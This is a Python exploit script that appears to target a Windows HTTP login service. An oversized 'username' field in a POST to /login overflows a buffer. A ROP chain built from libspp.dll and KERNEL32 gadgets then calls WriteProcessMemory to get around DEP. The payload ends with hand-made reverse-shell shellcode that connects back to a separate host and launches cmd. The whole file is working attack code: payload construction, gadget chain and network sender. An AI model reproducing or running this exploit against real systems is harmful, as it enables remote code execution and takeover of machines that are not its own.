#!/usr/bin/python 
import socket 
import sys 
import struct 

server = "127.0.0.1" 
port = 80 
CRASH = 1500 
OFFSET = 780

#\x00\x0d\x0a\x25\x26\x2b\x3d
rop_nop = struct.pack("<I",0x1001111e) #  : ret | ascii {PAGE_EXECUTE_READ} [libspp.dll]

#reverse shell crafted manually, since it's WriteProcessMemory an encoder does not work
shellcode = b"\x89\xe5\x81\xc4\xf0\xfd\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x56\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x38\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x09\xc1\xca\x0c\xd1\xca\x01\xc2\xeb\xf2\x39\x54\x24\x24\x75\xdd\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x68\x72\xfe\xb3\x16\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\x14\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\x04\x89\x45\x1c\x68\xd9\x09\xf5\xad\xff\x55\x04\x89\x45\x20\x68\x0c\xba\x2d\xb3\xff\x55\x04\x89\x45\x24\x89\xe0\x66\xb9\x90\x05\x29\xc8\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x1c\x31\xc0\x50\x50\x50\xb0\x06\x50\x2c\x05\x50\x40\x50\xff\x55\x20\x89\xc6\x31\xc0\x50\x50\x68\xc0\xa8\x01\x3c\x66\xb8\x01\xbb\xc1\xe0\x10\x66\x83\xc0\x02\x50\x54\x5f\x31\xc0\x50\x50\x50\x50\x04\x10\x50\x57\x56\xff\x55\x24\x56\x56\x56\x31\xc0\x50\x50\xb0\x80\x31\xc9\x66\xb9\x80\xff\x66\xf7\xd9\x01\xc8\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\xb0\x44\x50\x54\x5f\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x54\x5b\x89\xe0\x31\xc9\x66\xb9\x90\x03\x29\xc8\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"  

#1. Saving ESP in some registers
#cheating asrl with kernel32 :(
#esp to esi
rop = struct.pack("<I",0x76cf1b2e)  # PUSH ESP # POP ESI # RETN    ** [KERNEL32.DLL] ** 
#esi to eax
rop += struct.pack("<I",0x100e04a8)  # MOV EAX,ESI # POP ESI # RETN 0x04    ** [libspp.dll] **
rop += struct.pack("<I",0x41414141) # padding for pop esi
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
#eax to ecx
rop += struct.pack("<I",0x100baecb)  # XCHG EAX,ECX # RETN    ** [libspp.dll] **
#ecx do eax
rop += struct.pack("<I",0x10041cc8)  # MOV EAX,ECX # RETN    ** [libspp.dll] **     

#2. Jump over placeholder
rop += struct.pack("<I",0x100e0451)  # ADD ESP,30 # RETN 0x04    ** [libspp.dll] ** 
rop += rop_nop # padding for retn 0x04

# kernel32!WriteProcessMemory placeholder parameters
rop += struct.pack('<L', 0x10168074)    # Pointer to KERNEL32!GetDriveTypeA
rop += struct.pack('<L', 0x1016701c)    # RX from libspp no aslr
rop += struct.pack('<L', 0xFFFFFFFF)    # hProccess = handle to current process (Pseudo handle = 0xFFFFFFFF points to current process)
rop += struct.pack('<L', 0x1016701c)    # lpBaseAddress = RX from MODULE no aslr
rop += struct.pack('<L', 0x11111111)    # lpBuffer = base address of shellcode (dynamically generated)
rop += struct.pack('<L', 0x22222222)    # nSize = size of shellcode 
rop += struct.pack('<L', 0x1020c044)    # lpNumberOfBytesWritten = writable location RW in MODULE no aslr

#3. inc ecx * 48 in order to poin to 11111111
rop2 = struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *

#3a.saving shellcode address in eax
rop2 += struct.pack("<I",0x10141b4f)  # POP EBP # RETN    ** [libspp.dll] ** 
rop2 += struct.pack("<I",0xfffffdd0) # -560
rop2 += struct.pack("<I",0x1014c168)  # SUB EAX,EBP # POP ESI # POP EBP # POP EBX # RETN    ** [libspp.dll] ** 
rop2 += struct.pack("<I",0x41414141) # padding for pop esi
rop2 += struct.pack("<I",0x41414141) # padding for pop ebp
rop2 += struct.pack("<I",0x41414141) # padding for pop ebx
rop2 += struct.pack("<I",0x10114901)  # MOV DWORD PTR [ECX],EAX # RETN 0x0C    ** [libspp.dll] ** 
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c

#4.increase ecx by 4 to point 22222222
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0x1010adf1) # INC ECX # RETN    ** [libspp.dll] *
#4a. 401 to EAX
rop2 += struct.pack("<I",0x101205f1)  # XOR EAX,EAX # RETN    ** [libspp.dll] ** 
rop2 += struct.pack("<I",0x100cb2ce)  # POP EAX # RETN    ** [libspp.dll] *
rop2 += struct.pack("<I",0xfffffbff) # -401
rop2 += struct.pack("<I",0x100c1586)  # NEG EAX # RETN    ** [libspp.dll] **
#EAX -> [EDX]
rop2 += struct.pack("<I",0x10114901)  # MOV DWORD PTR [ECX],EAX # RETN 0x0C    ** [libspp.dll] ** 
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c

#5.decrease ecx to point to writeprocessmemory
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] ** 
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] ** 
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] ** 
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] ** 
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **  
rop2 += struct.pack("<I",0x100fcd73)  # DEC ECX # RETN    ** [libspp.dll] **

#5a saving ecx (pointer to KERNEL32!GetDriveTypeA) in eax
rop2 += struct.pack("<I",0x10041cc8)  # MOV EAX,ECX # RETN    ** [libspp.dll] ** 
#[EAX] -> EAX
rop2 += struct.pack("<I",0x1014dc4c)  # MOV EAX,DWORD PTR [EAX] # RETN 0xc  
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c
#[EAX] -> EAX
rop2 += struct.pack("<I",0x1014dc4c)  # MOV EAX,DWORD PTR [EAX] # RETN 0xc  
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c

# u KERNEL32!GetDriveTypeA + 00013d00 = WriteProcessMemoryStub
rop2 += struct.pack("<I",0x10141b4f)  # POP EBP # RETN    ** [libspp.dll] ** 
rop2 += struct.pack("<I",0xfffec2ff) #  ? -00013d01  
rop2 += struct.pack("<I",0x1014c168)  # SUB EAX,EBP # POP ESI # POP EBP # POP EBX # RETN    ** [libspp.dll] ** 
rop2 += struct.pack("<I",0x41414141) # padding for pop esi
rop2 += struct.pack("<I",0x41414141) # padding for pop ebp
rop2 += struct.pack("<I",0x41414141) # padding for pop ebx
rop2 += struct.pack("<I",0x10122ec7)  # DEC EAX # RETN    ** [libspp.dll] **
rop2 += struct.pack("<I",0x10114901)  # MOV DWORD PTR [ECX],EAX # RETN 0x0C    ** [libspp.dll] ** 
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c
rop2 += rop_nop # padding for retn 0x0c

#6 ecx -> eax -> esp
rop2 += struct.pack("<I",0x10041cc8)  # MOV EAX,ECX # RETN    ** [libspp.dll] **
rop2 += struct.pack("<I",0x10144265)   # XCHG EAX,ESP # RETN    ** [libspp.dll] **  

rop2 += b"\x90" * (501 - len(rop2)) 

payload = b"\x90" * OFFSET
payload += rop_nop
payload += rop_nop
payload += rop
payload += b"\x90" * 16
payload += rop2
payload += shellcode
payload += b"\x90" * (CRASH - len(payload))


content = b"username=" + payload + b"&password=A"  
buffer = b"POST /login HTTP/1.1\r\n" 
buffer += b"Host: " + server.encode() + b"\r\n" 
buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n" 
buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" 
buffer += b"Accept-Language: en-US,en;q=0.5\r\n" 
buffer += b"Referer: http://10.11.0.22/login\r\n" 
buffer += b"Connection: close\r\n" 
buffer += b"Content-Type: application/x-www-form-urlencoded\r\n" 
buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n" 
buffer += b"\r\n" 
buffer += content

print("Sending evil buffer...") 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((server, port)) 
s.send(buffer) 
s.close() 

print("Done!") 
